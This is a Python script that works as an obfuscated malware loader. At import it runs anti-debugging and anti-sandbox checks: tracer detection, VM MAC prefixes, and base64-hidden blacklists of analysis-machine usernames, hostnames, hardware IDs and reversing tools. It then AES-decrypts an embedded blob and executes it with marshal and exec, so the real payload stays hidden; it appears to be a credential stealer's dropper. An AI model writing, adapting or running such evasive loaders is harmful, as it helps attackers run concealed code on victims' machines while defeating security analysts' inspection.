import sys
import os
import base64
import marshal
import zlib
import traceback
import ast

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad


def _decode_list(enc: str):
    try:
        return ast.literal_eval(base64.b64decode(enc).decode())
    except Exception:
        return []


def _16z_DFPrCXujLGLu():
    try:
        if sys.gettrace():
            raise SystemExit

        try:
            import getpass
            username = getpass.getuser().lower()
            blacklist_usernames = _decode_list("WydkZWtrZXInLCAnV0RBR1V0aWxpdHlBY2NvdW50JywgJ0FiYnknLCAnaG1hcmMnLCAncGF0ZXgnLCAnUkRoSjBDTkZldnpYJywgJ2tFZWNmTXdnaicsICdGcmFuaycsICc4TmwwQ29sTlE1YnEnLCAnTGlzYScsICdKb2huJywgJ2dlb3JnZScsICdCcnVubycsICdQeG1kVU9wVnl4JywgJzhWaXpTTScsICd3MGZqdU9WbUNjUDVBJywgJ2xtVndqajliJywgJ1BxT05qSFZ3ZXhzUycsICczdTJ2OW04JywgJ0p1bGlhJywgJ0hFVWVSemwnLCAnZnJlZCcsICdzZXJ2ZXInLCAnQnZKQ2hSUG5zeG4nLCAnSGFycnkgSm9obnNvbicsICdTcWdGT2YzRycsICdMdWNhcycsICdtaWtlJywgJ1BhdGVYJywgJ2g3ZGsxeFByJywgJ0xvdWlzZScsICdVc2VyMDEnLCAndGVzdCcsICdSR3pjQlV5cnpuUmVnJywgJ3N0ZXBocGllJ10=")
            if username in blacklist_usernames:
                raise SystemExit
        except Exception:
            pass

        # Check hostname blacklist
        try:
            import socket
            hostname = socket.gethostname().upper()
            blacklist_hostnames = _decode_list("WydERVNLVE9QLUVJV0FJN0InLCAnMENDNDdBQzgzODAyJywgJ0JFRTczNzBDLThDMEMtNCcsICdERVNLVE9QLUVUNTFBSk8nLCAnOTY1NTQzJywgJ0RFU0tUT1AtTkFLRkZNVCcsICdXSU4tNUUwN0NPUzlBTFInLCAnQjMwRjAyNDItMUM2QS00JywgJ0RFU0tUT1AtVlJTUUxBRycsICdROUlBVFJLUFJIJywgJ1hDNjRaQicsICdERVNLVE9QLUQwMTlHRE0nLCAnREVTS1RPUC1XSThDTEVUJywgJ1NFUlZFUjEnLCAnTElTQS1QQycsICdKT0hOLVBDJywgJ0RFU0tUT1AtQjBUOTNENicsICdERVNLVE9QLTFQWUtQMjknLCAnREVTS1RPUC0xWTI0MzNSJywgJ1dJTEVZUEMnLCAnV09SSycsICc2QzRFNzMzRi1DMkQ5LTQnLCAnUkFMUEhTLVBDJywgJ0RFU0tUT1AtV0czTVlKUycsICdERVNLVE9QLTdYQzZHRVonLCAnREVTS1RPUC01T1Y5UzBPJywgJ1FhclpocmRCcGonLCAnT1JFTEVFUEMnLCAnQVJDSElCQUxEUEMnLCAnSlVMSUEtUEMnLCAnZDFibkprZlZsSCcsICdORVRUWVBDJywgJ0RFU0tUT1AtQlVHSU8nLCAnREVTS1RPUC1DQkdQRkVFJywgJ1NFUlZFUi1QQycsICdUSVFJWUxBOVRXNU0nLCAnREVTS1RPUC1LQUxWSU5PJywgJ0NPTVBOQU1FXzQwNDcnLCAnREVTS1RPUC0xOU9MTFREJywgJ0RFU0tUT1AtREUzNjlTRScsICdFQThDMkUyQS1EMDE3LTQnLCAnQUlEQU5QQycsICdMVUNBUy1QQycsICdNQVJDSS1QQycsICdBQ0VQQycsICdNSUtFLVBDJywgJ0RFU0tUT1AtSUFQS04xUCcsICdERVNLVE9QLU5UVTdWVU8nLCAnTE9VSVNFLVBDJywgJ1QwMDkxNycsICd0ZXN0NDInLCAndGVzdCdd")
            if hostname in blacklist_hostnames:
                raise SystemExit
        except Exception:
            pass

        # Check HWID blacklist
        try:
            import uuid
            hwid = str(uuid.getnode()).upper()
            blacklist_hwids = _decode_list("Wyc2NzFCQzVGNy00QjBGLUZGNDMtQjkyMy04QjE2NDU1ODFEQzgnLCAnN0FCNUM0OTQtMzlGNS00OTQxLTkxNjMtNDdGNTRENkQ1MDE2JywgJzAzREUwMjk0LTA0ODAtMDVERS0xQTA2LTM1MDcwMDA4MDAwOScsICcxMTExMTExMS0yMjIyLTMzMzMtNDQ0NC01NTU1NTU1NTU1NTUnLCAnNkYzQ0E1RUMtQkVDOS00QTRELTgyNzQtMTExNjhGNjQwMDU4JywgJ0FERUVFRTlFLUVGMEEtNkI4NC1CMTRCLUI4M0E1NEFGQzU0OCcsICc0QzRDNDU0NC0wMDUwLTM3MTAtODA1OC1DQUMwNEY1OTM0NEEnLCAnMDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtQUMxRjZCRDA0OTcyJywgJzAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAwMCcsICc1QkQyNEQ1Ni03ODlGLTg0NjgtN0NEQy1DQUE3MjIyQ0MxMjEnLCAnNDk0MzRENTMtMDIwMC05MDY1LTI1MDAtNjU5MDI1MDBFNDM5JywgJzQ5NDM0RDUzLTAyMDAtOTAzNi0yNTAwLTM2OTAyNTAwRjAyMicsICc3NzdEODRCMy04OEQxLTQ1MUMtOTNFNC1EMjM1MTc3NDIwQTcnLCAnNDk0MzRENTMtMDIwMC05MDM2LTI1MDAtMzY5MDI1MDAwQzY1JywgJ0IxMTEyMDQyLTUyRTgtRTI1Qi0zNjU1LTZBNEY1NDE1NURCRicsICcwMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC1BQzFGNkJEMDQ4RkUnLCAnRUIxNjkyNEItRkI2RC00RkExLTg2NjYtMTdCOTFGNjJGQjM3JywgJ0ExNUE5MzBDLTgyNTEtOTY0NS1BRjYzLUU0NUFENzI4QzIwQycsICc2N0U1OTVFQi01NEFDLTRGRjAtQjVFMy0zREE3QzdCNTQ3RTMnLCAnQzdEMjMzNDItQTVENC02OEExLTU5QUMtQ0Y0MEY3MzVCMzYzJywgJzYzMjAzMzQyLTBFQjAtQUExQS00REY1LTNGQjM3REJCMDY3MCcsICc0NEI5NEQ1Ni02NUFCLURDMDItODZBMC05ODE0M0E3NDIzQkYnLCAnNjYwODAwM0YtRUNFNC00OTRFLUIwN0UtMUM0NjE1RDFEOTNDJywgJ0Q5MTQyMDQyLThGNTEtNUVGRi1ENUY4LUVFOUFFM0QxNjAyQScsICc0OTQzNEQ1My0wMjAwLTkwMzYtMjUwMC0zNjkwMjUwMDNBRjAnLCAnOEI0RTgyNzgtNTI1Qy03MzQzLUI4MjUtMjgwQUVCQ0QzQkNCJywgJzRENEREQzk0LUUwNkMtNDRGNC05NUZFLTMzQTFBREE1QUMyNycsICc3OUFGNTI3OS0xNkNGLTQwOTQtOTc1OC1GODhBNjE2RDgxQjQnLCAnRkY1NzdCNzktNzgyRS0wQTRELTg1NjgtQjM1QTlCN0VCNzZCJywgJzA4QzFFNDAwLTNDNTYtMTFFQS04MDAwLTNDRUNFRjQzRkVERScsICc2RUNFQUY3Mi0zNTQ4LTQ3NkMtQkQ4RC03MzEzNEE5MTgyQzgnLCAnNDk0MzRENTMtMDIwMC05MDM2LTI1MDAtMzY5MDI1MDAzODY1JywgJzExOTYwMkU4LTkyRjktQkQ0Qi04OTc5LURBNjgyMjc2RDM4NScsICcxMjIwNEQ1Ni0yOEMwLUFCMDMtNTFCNy00NEE4Qjc1MjUyNTAnLCAnNjNGQTMzNDItMzFDNy00RThFLTgwODktREFGRjZDRTVFOTY3JywgJzM2NUI0MDAwLTNCMjUtMTFFQS04MDAwLTNDRUNFRjQ0MDEwQycsICdEOEMzMDMyOC0xQjA2LTQ2MTEtOEUzQy1FNDMzRjRGOTc5NEUnLCAnMDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtNTBFNTQ5MzM5MUVGJywgJzAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLUFDMUY2QkQwNEQ5OCcsICc0Q0I4MjA0Mi1CQThGLTE3NDgtQzk0MS0zNjNDMzkxQ0E3RjMnLCAnQjY0NjRBMkItOTJDNy00Qjk1LUEyRDAtRTU0MTAwODFCODEyJywgJ0JCMjMzMzQyLTJFMDEtNzE4Ri1ENEExLUU3RjY5RDAyNjQyOCcsICc5OTIxREUzQS01QzFBLURGMTEtOTA3OC01NjM0MTIwMDAwMjYnLCAnQ0M1QjNGNjItMkEwNC00RDJFLUE0NkMtQUE0MUI3MDUwNzEyJywgJzAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLUFDMUY2QkQwNDk4NicsICdDMjQ5OTU3QS1BQTA4LTRCMjEtOTMzRi05MjcxQkVDNjNDODUnLCAnQkU3ODRENTYtODFGNS0yQzhELTlENEItNUFCNTZGMDVEODZFJywgJ0FDQTY5MjAwLTNDNEMtMTFFQS04MDAwLTNDRUNFRjQ0MDFBQScsICczRjI4NENBNC04QkRGLTQ4OUItQTI3My00MUI0NEQ2NjhGNkQnLCAnQkI2NEUwNDQtODdCQS1DODQ3LUJDMEEtQzc5N0QxQTE2QTUwJywgJzJFNkZCNTk0LTlENTUtNDQyNC04RTc0LUNFMjVBMjVFMzZCMCcsICc0MkE4MjA0Mi0zRjEzLTUxMkYtNUUzRC02QkY0RkZGRDg1MTgnLCAnMzhBQjMzNDItNjZCMC03MTc1LTBCMjMtRjM5MEIzNzI4Qjc4JywgJzQ4OTQxQUU5LUQ1MkYtMTFERi1CQkRBLTUwMzczNDgyNjQzMScsICcwMzJFMDJCNC0wNDk5LTA1QzMtMDgwNi0zQzA3MDAwODAwMDknLCAnREQ5QzMzNDItRkI4MC05QTMxLUVCMDQtNTc5NEU1QUUyQjRDJywgJ0UwOERFOUFBLUM3MDQtNDI2MS1CMzJELTU3QjJBMzk5MzUxOCcsICcwN0U0MkU0Mi1GNDNELTNFMUMtMUM2Qi05QzdBQzEyMEYzQjknLCAnODhEQzMzNDItMTJFNi03RDYyLUIwQUUtQzgwRTU3OEU3QjA3JywgJzVFM0U3RkUwLTI2MzYtNENCNy04NEY1LThEMjY1MEZGRUMwRScsICc5NkJCMzM0Mi02MzM1LTBGQTgtQkEyOS1FMUJBNUQ4RkVGQkUnLCAnMDkzNEUzMzYtNzJFNC00RTZBLUIzRTUtMzgzQkQ4RTkzOEMzJywgJzEyRUUzMzQyLTg3QTItMzJERS1BMzkwLTRDMkRBNEQ1MTJFOScsICczODgxMzM0Mi1EN0QwLURGQzgtQzU2Ri03RkM5REZFNUM5NzInLCAnOERBNjIwNDItOEI1OS1CNEUzLUQyMzItMzhCMjlBMTA5NjRBJywgJzNBOUYzMzQyLUQxRjItREYzNy02OEFFLUMxMEY2MEJGQjQ2MicsICdGNTc0NDAwMC0zQzc4LTExRUEtODAwMC0zQ0VDRUY0M0ZFRkUnLCAnRkE4QzIwNDItMjA1RC0xM0IwLUZDQjUtQzVDQzU1NTc3QTM1JywgJ0M2QjMyMDQyLTRFQzMtNkZERi1DNzI1LTZGNjM5MTREQTdDNycsICdGQ0UyMzM0Mi05MUYxLUVBRkMtQkE5Ny01QUFFNDUwOUUxNzMnLCAnQ0YxQkUwMEYtNEFBRi00NTVFLThEQ0QtQjVCMDlCNkJGQThGJywgJzA1MEMzMzQyLUZBREQtQUVERi1FRjI0LUM2NDU0RTFBNzNDOScsICc0REMzMjA0Mi1FNjAxLUYzMjktMjFDMS0wM0YyNzU2NEZENkMnLCAnREVBRUI4Q0UtQTU3My05RjQ4LUJENDAtNjJFRDZDMjIzRjIwJywgJzA1NzkwQzAwLTNCMjEtMTFFQS04MDAwLTNDRUNFRjQ0MDBEMCcsICc1RUJEMkU0Mi0xREI4LTc4QTYtMEVDMy0wMzFCNjYxRDVDNTcnLCAnOUM2RDE3NDItMDQ2RC1CQzk0LUVEMDktQzM2RjcwQ0M5QTkxJywgJzkwN0EyQTc5LTcxMTYtNENCNi05RkE1LUU1QTU4QzQ1ODdDRCcsICdBOUM4MzM0Mi00ODAwLTA1NzgtMUVFOC1CQTI2RDJBNjc4RDInLCAnRDczODIwNDItMDBBMC1BNkYwLTFFNTEtRkQxQkJGMDZDRDcxJywgJzFENEQzMzQyLUQ2QzQtNzEwQy05OEEzLTlDQzY1NzEyMzRENScsICdDRTM1MkU0Mi05MzM5LTg0ODQtMjkzQS1CRDUwQ0RDNjM5QTUnLCAnNjBDODMzNDItMEE5Ny05MjhELTczMTYtNUYxMDgwQTc4RTcyJywgJzAyQUQ5ODk4LUZBMzctMTFFQi1BQzU1LTFEMEMwQTY3RUE4QScsICdEQkNDMzUxNC1GQTU3LTQ3N0QtOUQxRi0xQ0FGNENDOTJEMEYnLCAnRkVENjMzNDItRTBENi1DNjY5LUQ1M0YtMjUzRDY5NkQ3NERBJywgJzJERDFCMTc2LUMwNDMtNDlBNC04MzBGLUM2MjNGRkI4OEYzQycsICc0NzI5QUVCMC1GQzA3LTExRTMtOTY3My1DRTM5RTc5QzhBMDAnLCAnODRGRTMzNDItNkM2Ny01RkM2LTU2MzktOUIzQ0EzRDc3NUExJywgJ0RCQzIyRTQyLTU5RjctMTMyOS1EOUYyLUU3OEEyRUU1QkQwRCcsICdDRUZDODM2Qy04Q0IxLTQ1QTYtQURENy0yMDkwODVFRTJBNTcnLCAnQTc3MjE3NDItQkUyNC04QTFDLUI4NTktRDdGODI1MUE4M0QzJywgJzNGM0M1OEQxLUI0RjItNDAxOS1CMkEyLTJBNTAwRTk2QUYyRScsICdEMkRDMzM0Mi0zOTZDLTY3MzctQThGNi0wQzY2NzNDMURFMDgnLCAnRUFERDE3NDItNDgwNy0wMEEwLUY5MkUtQ0NEOTMzRTlEOEMxJywgJ0FGMUIyMDQyLTRCOTAtMDAwMC1BNEU0LTYzMkExQzhDN0VCMScsICdGRTQ1NUQxQS1CRTI3LTRCQTQtOTZDOC05NjdBNkQzQTk2NjEnLCAnOTIxRTIwNDItNzBEMy1GOUYxLThDQkQtQjM5OEEyMUY4OUM2J10=")
            for blacklisted_hwid in blacklist_hwids:
                if blacklisted_hwid.replace('-', '') in hwid.replace('-', ''):
                    raise SystemExit
        except Exception:
            pass

        if os.name == "nt":
            try:
                import ctypes
                if ctypes.windll.kernel32.IsDebuggerPresent():
                    raise SystemExit
                # Check for common debugger processes
                import subprocess
                procs = subprocess.check_output("tasklist", shell=True).decode(errors="ignore").lower()
                blacklist_programs = _decode_list("WydjaGVhdGVuZ2luZScsICdjaGVhdCBlbmdpbmUnLCAneDMyZGJnJywgJ3g2NGRiZycsICdvbGx5ZGJnJywgJ3dpbmRiZycsICdpZGEnLCAnaWRhNjQnLCAnZ2hpZHJhJywgJ3JhZGFyZTInLCAncmFkYXJlJywgJ2RiZycsICdpbW11bml0eWRiZycsICdkbnNweScsICdzb2Z0aWNlJywgJ2VkYicsICdkZWJ1Z2dlcicsICd2aXN1YWwgc3R1ZGlvIGRlYnVnZ2VyJywgJ2xsZGInLCAnZ2RiJywgJ3ZhbGdyaW5kJywgJ2hleC1yYXlzJywgJ2Rpc2Fzc2VtYmxlcicsICd0cmFjZXInLCAnZGVidWd2aWV3JywgJ3Byb2NkdW1wJywgJ3N0cmFjZScsICdsdHJhY2UnLCAnZHJtZW1vcnknLCAnZGVjb21waWxlcicsICdob3BwZXInLCAnYmluYXJ5IG5pbmphJywgJ2JvY2hzJywgJ3ZkYicsICdmcmlkYScsICdhcGkgbW9uaXRvcicsICdwcm9jZXNzIGhhY2tlcicsICdzeXNpbnRlcm5hbHMnLCAncHJvY2V4cCcsICdwcm9jZXNzIGV4cGxvcmVyJywgJ21vbml0b3IgdG9vbCcsICd2bW1hcCcsICd4cGVyZicsICdwZXJmdmlldycsICdweS1zcHknLCAnc3RyYWNlLWxvZydd")
                if any(x in procs for x in blacklist_programs):
                    raise SystemExit
            except Exception:
                pass
        else:
            try:
                if os.path.exists("/proc/self/status"):
                    with open("/proc/self/status") as f:
                        status = f.read()
                        if "TracerPid" in status:
                            pid = int(status.split("TracerPid:")[1].split()[0])
                            if pid != 0:
                                raise SystemExit
            except Exception:
                pass
    except Exception:
        pass


def _16z_OykbuAbOqWPU():
    try:
        import platform
        vm_indicators = ["vmware", "virtualbox", "vbox", "qemu", "xen", "kvm"]
        system_info = platform.platform().lower() + " " + platform.processor().lower()
        
        if any(indicator in system_info for indicator in vm_indicators):
            raise SystemExit
            
        # Check hostname blacklist
        try:
            import socket
            hostname = socket.gethostname().upper()
            blacklist_hostnames = ['DESKTOP-EIWAI7B', '0CC47AC83802', 'BEE7370C-8C0C-4', 'DESKTOP-ET51AJO', '965543', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42', 'test']
            if hostname in blacklist_hostnames:
                raise SystemExit
        except Exception:
            pass
            
        try:
            import uuid
            node_id = uuid.getnode()
            mac_bytes = []
            for shift in range(0, 12, 2):
                byte_val = (node_id >> shift) & 0xff
                mac_bytes.append('{:02x}'.format(byte_val))
            mac = ':'.join(mac_bytes[::-1])
            vm_macs = ["08:00:27", "00:05:69", "00:0c:29", "00:50:56", "00:1c:14"]
            if any(mac.startswith(vm_mac) for vm_mac in vm_macs):
                raise SystemExit
                
            # Check HWID blacklist
            hwid = str(uuid.uuid4()).upper()
            try:
                import subprocess
                if os.name == "nt":
                    result = subprocess.run(["wmic", "csproduct", "get", "uuid"], capture_output=True, text=True, timeout=2)
                    if result.returncode == 0:
                        out_lines = result.stdout.splitlines()
                        if len(out_lines) > 1:
                            hwid_candidate = out_lines[1].strip().upper()
                            if hwid_candidate:
                                hwid = hwid_candidate
                else:
                    hwid = str(uuid.getnode()).upper()
            except:
                pass
                
            blacklist_hwids = ['671BC5F7-4B0F-FF43-B923-8B1645581DC8', '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D', 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
            for blacklisted_hwid in blacklist_hwids:
                if blacklisted_hwid.replace('-', '') in hwid.replace('-', ''):
                    raise SystemExit
        except:
            pass
            
        import multiprocessing
        if multiprocessing.cpu_count() < 2:
            raise SystemExit
    except Exception:
        pass


_16z_DFPrCXujLGLu()
_16z_OykbuAbOqWPU()


def _16z_RlJ1U6t9uvxY(data: bytes, expect_hash: str):
    import hashlib
    digest = hashlib.sha256(data).hexdigest()
    if digest != expect_hash:
        raise SystemExit("Integrity check failed")


def _16z_YcHd72W4JkGC(parts):
    from functools import reduce
    return reduce(lambda a, b: bytes(x ^ y for x, y in zip(a, b)), parts)


_16z_93ApbaVD2r24 = [b"\xad\x13\xa8\xf0l(,\x9b\x0f?\xc5\xae\xd5\x8a\xa3\xc8C\x07<DH\xbe\xa6/\xb0\x8e\xf6\xaf\xec^6'", b'\x17\xf6|\xe1\xc4\xc4\xe14\xa5\x97\xbd\xfc\xc7\x91l\x93\xe9\xa8\x10\x1cch\xa0\xe3lU\\\x93\xa8\x12\xd0\xe3', b'\xd4aitl_{3\xa3\xf7\xdf6v*y\xdc\xf1L:%G\x039\x82\xf4$\xd1\xe7\x03\xd1V\x9f', b'#\xe0U\xea\xa2qR\x1e:\xe7\xf7\x98\xee\xe1K\x9a\xdb\x17B\x9dI\xeb\xa8\x94\xceN\x8f\xf3A\x0ePd']
_16z_L9MWXdQ6pgU7 = [b'\xa2\xb4uA\xfeU\xf8\xf4\x93\xaf\x10W\xe6\x88\xd3\x96', b'\xc9r\xb2\xa7\xd4\xfd\x19\xad\xf99\xe0\x17\x02I\x04?', b'U\xc9\x0f\x1cK\xb0\xea\xd56\x91)s\x16\x89\xde+']

_16z_i3Dwp2SygHeK = _16z_YcHd72W4JkGC(_16z_93ApbaVD2r24)
_16z_u1DJTFFHDfBs = _16z_YcHd72W4JkGC(_16z_L9MWXdQ6pgU7)


def _16z_fcdPidQ4sql4(data: bytes) -> str:
    try:
        _16z_evFv4jIVzNEj = AES.new(_16z_i3Dwp2SygHeK, AES.MODE_CBC, _16z_u1DJTFFHDfBs)
        return unpad(_16z_evFv4jIVzNEj.decrypt(data), 16).decode("utf-8", errors="ignore")
    except Exception:
        return ""


def _16z_0ilL0CLCOqnL(data: bytes) -> bytes:
    try:
        _16z_evFv4jIVzNEj = AES.new(_16z_i3Dwp2SygHeK, AES.MODE_CBC, _16z_u1DJTFFHDfBs)
        return unpad(_16z_evFv4jIVzNEj.decrypt(data), 16)
    except Exception:
        return b""


_16z_SGJD6GOxWxlU = _16z_fcdPidQ4sql4
_16z_YKb0HcwqXs6q = _16z_0ilL0CLCOqnL


def _16z_ZsNdji1mY0FF():
    v = 0
    for i in range(5):
        v ^= (i * 31337) << (i % 3)
    return v


def _16z_Vwyy95J1D7O4(text="fuck"):
    return "-".join(reversed(list(text)))




def _16z_fboxglZV9U0u():
    try:
        _16z_yeyxXKHR4cAq = 'lFY?4v@Agf-h&9~oy8k=(MW5DpSN^S-#{r(^;+WUcJATo;f2!FvVygLG#lco7R)%l#cD0IJ&5_C<wD@zO5M@rrj0C<AXkk?mto9@2ySZdI5oLSZiiO+`a!Y4*I1M{Dzh7<XsgW+Lp))QVua=TEgVDth9kXj;J9J`ZOVcH!p5(dc#8mx9UNGbmYSx1px-@;-gHp;=%S`jkv|4NQxZrJrMjZ+76>dIo9{LigcoK2s|xA#7>0(1bR^8oD+LXz)T$KF5Nk@hBv`<1qrn#wyNtYQcN@*SkNbxD)ZVFFcnzaNmXLjAJ>UAhU8P92M1$gcOrc;g8SX{MP<hOK>)gDS7@w?LLTRjMYDn=X8rdf`K8BkVCEfw7c0xWfT%Q20xY%O9aQ)(?Th)i{cSGQz3mW23'

        _16z_CYAvW7PppvFw = base64.b85decode(_16z_yeyxXKHR4cAq)
        _16z_qEwcm1hgQup9, _16z_qtlCQW2ma3xj, _16z_SRNm1oX8ZmeD = _16z_CYAvW7PppvFw[:16], _16z_CYAvW7PppvFw[16:32], _16z_CYAvW7PppvFw[32:]

        _16z_evFv4jIVzNEj = AES.new(_16z_i3Dwp2SygHeK, AES.MODE_GCM, nonce=_16z_qEwcm1hgQup9)
        _16z_M52zak2fvluZ = _16z_evFv4jIVzNEj.decrypt_and_verify(_16z_SRNm1oX8ZmeD, _16z_qtlCQW2ma3xj)
        _16z_RlJ1U6t9uvxY(_16z_M52zak2fvluZ, 'f0c061dfebb52bd2955a35f2512c7e498f8cfb9390a3a55948be1a122c9fb17b')
        _16z_ytB352D1bSsE = zlib.decompress(_16z_M52zak2fvluZ)

        _ = _16z_ZsNdji1mY0FF()
        _ = _16z_Vwyy95J1D7O4("obf")

        _16z_gwmUZJ4FWRiA = {
            "__name__": "__main__",
            "__builtins__": __builtins__,
            "_decrypt_str": _16z_SGJD6GOxWxlU,
            "_decrypt_bytes": _16z_YKb0HcwqXs6q,
        }

        exec(marshal.loads(_16z_ytB352D1bSsE), _16z_gwmUZJ4FWRiA)
    except Exception:
        print("Execution failed:")
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    _16z_fboxglZV9U0u()
